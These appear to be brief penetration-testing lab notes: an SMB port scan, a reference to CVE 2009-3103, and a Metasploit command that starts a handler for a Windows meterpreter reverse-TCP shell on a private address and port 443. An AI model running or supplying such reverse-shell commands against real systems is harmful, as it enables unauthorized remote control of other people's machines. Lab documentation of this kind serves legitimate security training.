
- Found a vulnerability by scanning the ports for SMB
- MSF command for 2009-3103
```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.189;set LPORT 443;run;"
```
